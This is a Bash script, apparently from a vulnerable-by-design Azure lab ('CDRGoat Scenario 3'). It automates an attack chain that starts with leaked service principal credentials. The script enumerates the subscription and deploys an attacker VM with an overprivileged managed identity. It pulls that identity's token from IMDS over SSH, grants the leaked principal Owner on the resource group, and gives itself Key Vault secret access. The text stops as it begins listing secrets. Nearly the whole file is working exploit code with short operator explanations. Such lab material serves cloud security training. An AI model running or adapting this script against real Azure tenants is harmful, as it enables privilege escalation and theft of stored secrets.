#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \\/ _ \\/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \\/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===       CDRGoat Azure - Scenario 3                 ===" "${RESET}"
  printf "%sLeaked App Registration → UAMI Privilege Escalation%s\n\n" "${GREEN}" "${RESET}"
  printf "This automated attack script will:\n"
  printf "  • Step 1. Authenticate using leaked App Registration credentials\n"
  printf "  • Step 2. Enumerate subscription resources and role assignments\n"
  printf "  • Step 3. Discover overprivileged User-Assigned Managed Identity\n"
  printf "  • Step 4. Deploy rogue VM with UAMI attached\n"
  printf "  • Step 5. Use UAMI to escalate privileges (grant Owner)\n"
  printf "  • Step 6. Access Key Vault and exfiltrate sensitive data\n"
}
banner

#############################################
# Preflight checks
#############################################
step "Preflight checks"
missing=0
for c in curl jq ssh-keygen az; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

#############################################
# Step 1. Authenticate using leaked credentials
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Authenticate using leaked App Registration credentials  ===" "${RESET}"

step "Credential input"
printf "Enter the leaked App Registration credentials (simulating GitHub leak discovery):\n\n"

read -r -p "  Client ID: " CLIENT_ID
read -r -p "  Client Secret: " CLIENT_SECRET
read -r -p "  Tenant ID: " TENANT_ID

if [ -z "$CLIENT_ID" ] || [ -z "$CLIENT_SECRET" ] || [ -z "$TENANT_ID" ]; then
  err "All credential fields are required"
  exit 1
fi

ok "Credentials received"

step "Authenticating to Azure using leaked Service Principal"
spin_start "Requesting Azure Management token (client_credentials flow)"

set +e
TOKEN_RESPONSE="$(curl -sS -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=${CLIENT_ID}&client_secret=${CLIENT_SECRET}&grant_type=client_credentials&resource=https://management.azure.com" \
  "https://login.microsoftonline.com/${TENANT_ID}/oauth2/token")"
CURL_RC=$?
set -e
spin_stop

AZURE_TOKEN="$(echo "$TOKEN_RESPONSE" | jq -r '.access_token')"

if [ $CURL_RC -ne 0 ] || [ -z "$AZURE_TOKEN" ] || [ "$AZURE_TOKEN" = "null" ]; then
  err "Failed to authenticate using leaked credentials"
  echo "$TOKEN_RESPONSE" | jq .
  exit 1
fi

ok "Successfully authenticated as leaked Service Principal"

# Extract identity info from JWT
step "Analyzing access token (JWT)"
TOKEN_PAYLOAD="$(echo "$AZURE_TOKEN" | awk -F. '{print $2}' | tr '_-' '/+' | base64 -d 2>/dev/null | jq .)"
SP_OID="$(echo "$TOKEN_PAYLOAD" | jq -r '.oid')"
APP_ID="$(echo "$TOKEN_PAYLOAD" | jq -r '.appid')"

info "Authenticated identity:"
printf "  • Object ID (oid) : %s%s%s\n" "$YELLOW" "$SP_OID" "$RESET"
printf "  • App ID (appid)  : %s%s%s\n" "$YELLOW" "$APP_ID" "$RESET"
printf "  • Tenant ID       : %s%s%s\n" "$YELLOW" "$TENANT_ID" "$RESET"

step "Discovering accessible subscriptions"
spin_start "Querying subscriptions API"

SUBSCRIPTIONS_JSON="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2022-12-01")"

spin_stop

SUBSCRIPTION_COUNT="$(echo "$SUBSCRIPTIONS_JSON" | jq '.value | length')"

if [ "$SUBSCRIPTION_COUNT" -eq 0 ]; then
  err "No accessible subscriptions found"
  exit 1
fi

# Use the first accessible subscription
SUBSCRIPTION_ID="$(echo "$SUBSCRIPTIONS_JSON" | jq -r '.value[0].subscriptionId')"
SUBSCRIPTION_NAME="$(echo "$SUBSCRIPTIONS_JSON" | jq -r '.value[0].displayName')"

ok "Discovered subscription: ${YELLOW}${SUBSCRIPTION_NAME}${RESET} (${SUBSCRIPTION_ID})"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We successfully authenticated using ${MAGENTA}leaked App Registration credentials${RESET}.\n\n"
printf "This simulates a common attack scenario where credentials are:\n"
printf "  • Accidentally committed to public GitHub repositories\n"
printf "  • Exposed in CI/CD pipeline logs\n"
printf "  • Found in developer laptops or shared drives\n"
printf "  • Leaked through misconfigured storage accounts\n\n"
printf "The OAuth ${YELLOW}client_credentials${RESET} flow allows direct API access\n"
printf "without any user interaction — perfect for automation abuse.\n\n"

read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 2. Enumerate subscription resources
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Enumerate subscription resources and role assignments  ===" "${RESET}"

step "Enumerating Azure resources in subscription"
spin_start "Calling ARM resources API"

set +e
RESOURCES_JSON="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resources?api-version=2022-12-01")"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ]; then
  err "Failed to enumerate resources (curl rc=$CURL_RC)"
  exit 1
fi

if echo "$RESOURCES_JSON" | jq -e '.error' >/dev/null 2>&1; then
  msg="$(echo "$RESOURCES_JSON" | jq -r '.error.message')"
  err "ARM API error: $msg"
  exit 1
fi

RESOURCE_COUNT="$(echo "$RESOURCES_JSON" | jq '.value | length')"
ok "Retrieved $RESOURCE_COUNT resources"

echo "$RESOURCES_JSON" | jq -r --arg YELLOW "$YELLOW" --arg RESET "$RESET" \
  '.value[] | "  • [\(.type)] \($YELLOW)\(.name)\($RESET)"'

# Extract resource group from resources
RESOURCE_GROUP="$(echo "$RESOURCES_JSON" | jq -r '.value[0].id | split("/")[4]')"
info "Target Resource Group: ${YELLOW}${RESOURCE_GROUP}${RESET}"

step "Enumerating role assignments for Resource Group"
spin_start "Querying roleAssignments API"

set +e
ROLE_ASSIGNMENTS_JSON="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01")"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ]; then
  err "Failed to enumerate role assignments"
  exit 1
fi

ROLE_COUNT="$(echo "$ROLE_ASSIGNMENTS_JSON" | jq '.value | length')"
ok "Found $ROLE_COUNT role assignments in Resource Group"

# Build role name lookup
declare -A ROLE_NAMES
ROLE_IDS=($(echo "$ROLE_ASSIGNMENTS_JSON" | jq -r '.value[].properties.roleDefinitionId | split("/")[-1]' | sort -u))

for role_id in "${ROLE_IDS[@]}"; do
  role_name=$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
    "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/providers/Microsoft.Authorization/roleDefinitions/${role_id}?api-version=2022-04-01" \
    | jq -r '.properties.roleName // "Unknown Role"')
  ROLE_NAMES[$role_id]="$role_name"
done

# Display role assignments for our SP
info "Role assignments for leaked SP (${SP_OID}):"
echo "$ROLE_ASSIGNMENTS_JSON" | jq -c --arg OID "$SP_OID" '.value[] | select(.properties.principalId == $OID)' | while read -r entry; do
  scope=$(echo "$entry" | jq -r '.properties.scope')
  role_id=$(echo "$entry" | jq -r '.properties.roleDefinitionId | split("/")[-1]')
  role_name="${ROLE_NAMES[$role_id]:-Unknown}"
  printf "  • Role  : %s%s%s\n" "$YELLOW" "$role_name" "$RESET"
  printf "    Scope : %s\n\n" "$scope"
done

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We enumerated resources using the leaked SP's ${YELLOW}Reader${RESET} role.\n\n"
printf "Key findings:\n"
printf "  • The SP has ${MAGENTA}Contributor${RESET} on the resource group\n"
printf "  • This allows deploying new resources (VMs, storage, etc.)\n"
printf "  • We discovered a ${YELLOW}User-Assigned Managed Identity${RESET} in the RG\n\n"
printf "Next: Investigate the UAMI's permissions - it might be overprivileged.\n\n"

read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 3. Discover UAMI and analyze privileges
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Discover overprivileged User-Assigned Managed Identity  ===" "${RESET}"

step "Identifying User-Assigned Managed Identities"
spin_start "Filtering resources for type Microsoft.ManagedIdentity"

UAMI_RESOURCE="$(echo "$RESOURCES_JSON" | jq -r '.value[] | select(.type == "Microsoft.ManagedIdentity/userAssignedIdentities")')"
UAMI_NAME="$(echo "$UAMI_RESOURCE" | jq -r '.name')"
UAMI_ID="$(echo "$UAMI_RESOURCE" | jq -r '.id')"

spin_stop

if [ -z "$UAMI_NAME" ] || [ "$UAMI_NAME" = "null" ]; then
  err "No User-Assigned Managed Identity found"
  exit 1
fi

ok "Found UAMI: ${YELLOW}${UAMI_NAME}${RESET}"

step "Retrieving UAMI details"
spin_start "Querying UAMI properties"

UAMI_DETAILS="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
  "https://management.azure.com${UAMI_ID}?api-version=2023-01-31")"

spin_stop

UAMI_PRINCIPAL_ID="$(echo "$UAMI_DETAILS" | jq -r '.properties.principalId')"
UAMI_CLIENT_ID="$(echo "$UAMI_DETAILS" | jq -r '.properties.clientId')"

info "UAMI properties:"
printf "  • Name         : %s%s%s\n" "$YELLOW" "$UAMI_NAME" "$RESET"
printf "  • Principal ID : %s%s%s\n" "$YELLOW" "$UAMI_PRINCIPAL_ID" "$RESET"
printf "  • Client ID    : %s%s%s\n" "$YELLOW" "$UAMI_CLIENT_ID" "$RESET"
printf "  • Resource ID  : %s\n" "$UAMI_ID"

step "Analyzing UAMI role assignments"

info "Role assignments for UAMI (${UAMI_PRINCIPAL_ID}):"
echo "$ROLE_ASSIGNMENTS_JSON" | jq -c --arg OID "$UAMI_PRINCIPAL_ID" '.value[] | select(.properties.principalId == $OID)' | while read -r entry; do
  scope=$(echo "$entry" | jq -r '.properties.scope')
  role_id=$(echo "$entry" | jq -r '.properties.roleDefinitionId | split("/")[-1]')
  role_name="${ROLE_NAMES[$role_id]:-Unknown}"
  
  # Highlight dangerous roles
  if [[ "$role_name" == *"User Access Administrator"* ]] || [[ "$role_name" == *"Owner"* ]]; then
    printf "  • Role  : %s%s%s %s[DANGEROUS]%s\n" "$RED" "$role_name" "$RESET" "$RED" "$RESET"
  else
    printf "  • Role  : %s%s%s\n" "$YELLOW" "$role_name" "$RESET"
  fi
  printf "    Scope : %s\n\n" "$scope"
done

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "CRITICAL FINDING: The UAMI has ${RED}User Access Administrator${RESET} at Resource Group scope!\n\n"
printf "This is a common misconfiguration. User Access Administrator allows:\n"
printf "  • Granting ${YELLOW}any RBAC role${RESET} to ${YELLOW}any principal${RESET} on resources in this RG\n"
printf "  • Including granting ${RED}Owner${RESET} on the RG to the attacker's SP\n"
printf "  • This gives full control over all resources in the RG (VMs, Key Vault, etc.)\n\n"
printf "Attack plan:\n"
printf "  1. Deploy a VM with this UAMI attached\n"
printf "  2. Use IMDS to get a token for the UAMI\n"
printf "  3. Use the token to grant Owner on RG to our SP\n"
printf "  4. Access Key Vault secrets in this RG\n\n"

read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 4. Deploy rogue VM with UAMI attached
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Deploy rogue VM with UAMI attached  ===" "${RESET}"

# Get location from Resource Group
step "Retrieving Resource Group location"
spin_start "Querying Resource Group properties"

RG_INFO="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}?api-version=2022-09-01")"
LOCATION="$(echo "$RG_INFO" | jq -r '.location')"

spin_stop
ok "Location: ${YELLOW}${LOCATION}${RESET}"

step "Generating SSH key pair for VM access"
SSH_KEY_PATH="/tmp/streamgoat3_rsa_$$"
ssh-keygen -t rsa -b 2048 -f "$SSH_KEY_PATH" -N "" -q
ok "SSH key pair generated: ${SSH_KEY_PATH}"

SSH_PUB_KEY="$(cat "${SSH_KEY_PATH}.pub")"

VM_NAME="rogue-vm-$(date +%s)"

step "Creating attacker-controlled Virtual Network"
spin_start "Deploying VNet resource"

VNET_NAME="${VM_NAME}-vnet"

curl -sS -X PUT \
  -H "Authorization: Bearer $AZURE_TOKEN" \
  -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Network/virtualNetworks/${VNET_NAME}?api-version=2023-05-01" \
  -d "{
    \"location\": \"${LOCATION}\",
    \"properties\": {
      \"addressSpace\": {
        \"addressPrefixes\": [\"10.66.0.0/16\"]
      },
      \"subnets\": [{
        \"name\": \"attacker-subnet\",
        \"properties\": {
          \"addressPrefix\": \"10.66.1.0/24\"
        }
      }]
    }
  }" >/dev/null

sleep 10
spin_stop
ok "VNet created: ${YELLOW}${VNET_NAME}${RESET}"

SUBNET_ID="/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Network/virtualNetworks/${VNET_NAME}/subnets/attacker-subnet"

step "Creating Network Security Group with SSH access"
spin_start "Deploying NSG resource"

NSG_NAME="${VM_NAME}-nsg"

curl -sS -X PUT \
  -H "Authorization: Bearer $AZURE_TOKEN" \
  -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Network/networkSecurityGroups/${NSG_NAME}?api-version=2023-05-01" \
  -d "{
    \"location\": \"${LOCATION}\",
    \"properties\": {
      \"securityRules\": [{
        \"name\": \"AllowSSH\",
        \"properties\": {
          \"priority\": 1001,
          \"direction\": \"Inbound\",
          \"access\": \"Allow\",
          \"protocol\": \"Tcp\",
          \"sourceAddressPrefix\": \"*\",
          \"sourcePortRange\": \"*\",
          \"destinationAddressPrefix\": \"*\",
          \"destinationPortRange\": \"22\"
        }
      }]
    }
  }" >/dev/null

sleep 10
spin_stop
ok "NSG created with SSH rule: ${YELLOW}${NSG_NAME}${RESET}"

step "Creating Public IP for rogue VM"
spin_start "Deploying Public IP resource"

PIP_NAME="${VM_NAME}-pip"

curl -sS -X PUT \
  -H "Authorization: Bearer $AZURE_TOKEN" \
  -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Network/publicIPAddresses/${PIP_NAME}?api-version=2023-05-01" \
  -d "{
    \"location\": \"${LOCATION}\",
    \"properties\": {
      \"publicIPAllocationMethod\": \"Static\"
    },
    \"sku\": {
      \"name\": \"Standard\"
    }
  }" >/dev/null

# Wait for PIP provisioning
sleep 15

PIP_DETAILS="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Network/publicIPAddresses/${PIP_NAME}?api-version=2023-05-01")"

PIP_ID="$(echo "$PIP_DETAILS" | jq -r '.id')"
spin_stop
ok "Public IP created"

step "Creating Network Interface"
spin_start "Deploying NIC resource"

NIC_NAME="${VM_NAME}-nic"
NSG_ID="/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Network/networkSecurityGroups/${NSG_NAME}"

curl -sS -X PUT \
  -H "Authorization: Bearer $AZURE_TOKEN" \
  -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Network/networkInterfaces/${NIC_NAME}?api-version=2023-05-01" \
  -d "{
    \"location\": \"${LOCATION}\",
    \"properties\": {
      \"ipConfigurations\": [{
        \"name\": \"ipconfig1\",
        \"properties\": {
          \"subnet\": {
            \"id\": \"${SUBNET_ID}\"
          },
          \"publicIPAddress\": {
            \"id\": \"${PIP_ID}\"
          }
        }
      }],
      \"networkSecurityGroup\": {
        \"id\": \"${NSG_ID}\"
      }
    }
  }" >/dev/null

# Wait for NIC provisioning
sleep 15

NIC_ID="/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Network/networkInterfaces/${NIC_NAME}"
spin_stop
ok "Network Interface created"

step "Deploying rogue VM with UAMI attached"
spin_start "Creating Virtual Machine (this may take 2-3 minutes)"

curl -sS -X PUT \
  -H "Authorization: Bearer $AZURE_TOKEN" \
  -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Compute/virtualMachines/${VM_NAME}?api-version=2023-07-01" \
  -d "{
    \"location\": \"${LOCATION}\",
    \"identity\": {
      \"type\": \"UserAssigned\",
      \"userAssignedIdentities\": {
        \"${UAMI_ID}\": {}
      }
    },
    \"properties\": {
      \"hardwareProfile\": {
        \"vmSize\": \"Standard_B1s\"
      },
      \"storageProfile\": {
        \"imageReference\": {
          \"publisher\": \"Canonical\",
          \"offer\": \"0001-com-ubuntu-server-jammy\",
          \"sku\": \"22_04-lts-gen2\",
          \"version\": \"latest\"
        },
        \"osDisk\": {
          \"createOption\": \"FromImage\",
          \"managedDisk\": {
            \"storageAccountType\": \"Standard_LRS\"
          }
        }
      },
      \"osProfile\": {
        \"computerName\": \"roguevm\",
        \"adminUsername\": \"attacker\",
        \"linuxConfiguration\": {
          \"disablePasswordAuthentication\": true,
          \"ssh\": {
            \"publicKeys\": [{
              \"path\": \"/home/attacker/.ssh/authorized_keys\",
              \"keyData\": \"${SSH_PUB_KEY}\"
            }]
          }
        }
      },
      \"networkProfile\": {
        \"networkInterfaces\": [{
          \"id\": \"${NIC_ID}\"
        }]
      }
    }
  }" >/dev/null

# Wait for VM provisioning
sleep 120

spin_stop
ok "Rogue VM deployed with UAMI attached"

step "Retrieving VM public IP"
spin_start "Querying Public IP address"

PIP_DETAILS="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Network/publicIPAddresses/${PIP_NAME}?api-version=2023-05-01")"

VM_PUBLIC_IP="$(echo "$PIP_DETAILS" | jq -r '.properties.ipAddress')"
spin_stop

ok "VM Public IP: ${YELLOW}${VM_PUBLIC_IP}${RESET}"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We deployed a complete attack infrastructure using ${YELLOW}Contributor${RESET} permissions:\n\n"
printf "  • ${MAGENTA}Virtual Network${RESET} with attacker-controlled address space\n"
printf "  • ${MAGENTA}Network Security Group${RESET} allowing SSH from anywhere\n"
printf "  • ${MAGENTA}Public IP${RESET} for remote access\n"
printf "  • ${MAGENTA}Virtual Machine${RESET} with the overprivileged UAMI attached\n\n"
printf "This demonstrates the full power of Contributor permissions - the attacker\n"
printf "can deploy any infrastructure needed for the attack.\n\n"
printf "This technique is known as ${RED}identity hijacking${RESET} or ${RED}UAMI abuse${RESET}.\n"
printf "By attaching an existing UAMI to our controlled compute, we inherit\n"
printf "all permissions assigned to that identity.\n\n"

read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 5. Use UAMI to escalate privileges
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Use UAMI to escalate privileges (grant Owner)  ===" "${RESET}"

step "Connecting to rogue VM via SSH"
info "VM: ${VM_PUBLIC_IP}, User: attacker, Key: ${SSH_KEY_PATH}"

# Give VM a moment to fully boot
sleep 30

step "Fetching UAMI token from IMDS inside rogue VM"
spin_start "Requesting management token via IMDS"

set +e
UAMI_TOKEN_JSON="$(ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=30 \
  -i "$SSH_KEY_PATH" attacker@"$VM_PUBLIC_IP" \
  "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com&client_id=${UAMI_CLIENT_ID}'" 2>/dev/null)"
SSH_RC=$?
set -e
spin_stop

if [ $SSH_RC -ne 0 ]; then
  err "SSH connection failed. The VM may still be starting up."
  info "Try manually: ssh -i ${SSH_KEY_PATH} attacker@${VM_PUBLIC_IP}"
  exit 1
fi

UAMI_TOKEN="$(echo "$UAMI_TOKEN_JSON" | jq -r '.access_token')"

if [ -z "$UAMI_TOKEN" ] || [ "$UAMI_TOKEN" = "null" ]; then
  err "Failed to get UAMI token from IMDS"
  echo "$UAMI_TOKEN_JSON"
  exit 1
fi

ok "UAMI token acquired from IMDS"

step "Granting Owner role to leaked SP using UAMI (at Resource Group scope)"
spin_start "Creating role assignment via ARM API"

# Generate unique role assignment name
ROLE_ASSIGNMENT_ID="$(uuidgen | tr '[:upper:]' '[:lower:]')"

# Owner role definition ID (built-in)
OWNER_ROLE_ID="8e3af657-a8ff-443c-a75c-2fe8c4bcb635"

# Resource Group scope (UAMI has User Access Administrator here)
RG_SCOPE="/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}"

set +e
GRANT_RESPONSE="$(curl -sS -X PUT \
  -H "Authorization: Bearer $UAMI_TOKEN" \
  -H "Content-Type: application/json" \
  "https://management.azure.com${RG_SCOPE}/providers/Microsoft.Authorization/roleAssignments/${ROLE_ASSIGNMENT_ID}?api-version=2022-04-01" \
  -d "{
    \"properties\": {
      \"roleDefinitionId\": \"/subscriptions/${SUBSCRIPTION_ID}/providers/Microsoft.Authorization/roleDefinitions/${OWNER_ROLE_ID}\",
      \"principalId\": \"${SP_OID}\",
      \"principalType\": \"ServicePrincipal\"
    }
  }")"
CURL_RC=$?
set -e
spin_stop

if echo "$GRANT_RESPONSE" | jq -e '.error' >/dev/null 2>&1; then
  msg="$(echo "$GRANT_RESPONSE" | jq -r '.error.message')"
  err "Failed to grant Owner role: $msg"
  exit 1
fi

ok "Successfully granted ${RED}Owner${RESET} role on Resource Group to leaked SP!"

# Verify the new role assignment
step "Verifying privilege escalation"
spin_start "Re-fetching role assignments for Resource Group"

sleep 10

NEW_ROLE_ASSIGNMENTS="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01")"

spin_stop

info "Updated role assignments for leaked SP (${SP_OID}) on Resource Group:"
echo "$NEW_ROLE_ASSIGNMENTS" | jq -c --arg OID "$SP_OID" '.value[] | select(.properties.principalId == $OID)' | while read -r entry; do
  scope=$(echo "$entry" | jq -r '.properties.scope')
  role_id=$(echo "$entry" | jq -r '.properties.roleDefinitionId | split("/")[-1]')
  
  # Resolve role name
  role_name=$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
    "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/providers/Microsoft.Authorization/roleDefinitions/${role_id}?api-version=2022-04-01" \
    | jq -r '.properties.roleName // "Unknown"')
  
  if [[ "$role_name" == "Owner" ]]; then
    printf "  • Role  : %s%s%s %s[NEW - ESCALATED]%s\n" "$RED" "$role_name" "$RESET" "$RED" "$RESET"
  else
    printf "  • Role  : %s%s%s\n" "$YELLOW" "$role_name" "$RESET"
  fi
  printf "    Scope : %s\n\n" "$scope"
done

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "PRIVILEGE ESCALATION SUCCESSFUL!\n\n"
printf "We used the UAMI's ${RED}User Access Administrator${RESET} permissions to:\n"
printf "  • Grant ${RED}Owner${RESET} role on Resource Group to our SP\n\n"
printf "Owner role on RG provides:\n"
printf "  • Full control over all resources in the Resource Group\n"
printf "  • Ability to manage RBAC within the RG\n"
printf "  • Access to data plane operations (Key Vault, Storage, etc.)\n"
printf "  • Deploy additional resources for persistence\n\n"
printf "The attack chain: Leaked creds → Contributor → Deploy VM → UAMI → Owner on RG\n\n"

read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 6. Access Key Vault and exfiltrate data
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Access Key Vault and exfiltrate sensitive data  ===" "${RESET}"

step "Identifying Key Vaults in subscription"
spin_start "Filtering resources for Microsoft.KeyVault"

KV_RESOURCE="$(echo "$RESOURCES_JSON" | jq -r '.value[] | select(.type == "Microsoft.KeyVault/vaults")')"
KV_NAME="$(echo "$KV_RESOURCE" | jq -r '.name')"
KV_ID="$(echo "$KV_RESOURCE" | jq -r '.id')"

spin_stop

if [ -z "$KV_NAME" ] || [ "$KV_NAME" = "null" ]; then
  err "No Key Vault found"
  exit 0
fi

ok "Found Key Vault: ${YELLOW}${KV_NAME}${RESET}"

step "Granting ourselves Key Vault Secrets User role"
spin_start "Creating role assignment for Key Vault access"

KV_ROLE_ASSIGNMENT_ID="$(uuidgen | tr '[:upper:]' '[:lower:]')"
# Key Vault Secrets User role definition ID
KV_SECRETS_USER_ROLE="4633458b-17de-408a-b874-0445c86b69e6"

curl -sS -X PUT \
  -H "Authorization: Bearer $AZURE_TOKEN" \
  -H "Content-Type: application/json" \
  "https://management.azure.com${KV_ID}/providers/Microsoft.Authorization/roleAssignments/${KV_ROLE_ASSIGNMENT_ID}?api-version=2022-04-01" \
  -d "{
    \"properties\": {
      \"roleDefinitionId\": \"/subscriptions/${SUBSCRIPTION_ID}/providers/Microsoft.Authorization/roleDefinitions/${KV_SECRETS_USER_ROLE}\",
      \"principalId\": \"${SP_OID}\",
      \"principalType\": \"ServicePrincipal\"
    }
  }" >/dev/null

sleep 30
spin_stop
ok "Key Vault Secrets User role granted"

step "Fetching vault token"
spin_start "Requesting token for vault.azure.net"

VAULT_TOKEN_RESPONSE="$(curl -sS -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=${CLIENT_ID}&client_secret=${CLIENT_SECRET}&grant_type=client_credentials&resource=https://vault.azure.net" \
  "https://login.microsoftonline.com/${TENANT_ID}/oauth2/token")"

VAULT_TOKEN="$(echo "$VAULT_TOKEN_RESPONSE" | jq -r '.access_token')"
spin_stop

if [ -z "$VAULT_TOKEN" ] || [ "$VAULT_TOKEN" = "null" ]; then
  err "Failed to get vault token"
  exit 1
fi

ok "Vault token acquired"

step "Retrieving Key Vault URI"
spin_start "Querying vault properties"

KV_DETAILS="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
  "https://management.azure.com${KV_ID}?api-version=2023-02-01")"

VAULT_URI="$(echo "$KV_DETAILS" | jq -r '.properties.vaultUri')"
spin_stop

ok "Vault URI: ${YELLOW}${VAULT_URI}${RESET}"

step "Enumerating secrets in Key Vault"
spin_start "Listing secrets"

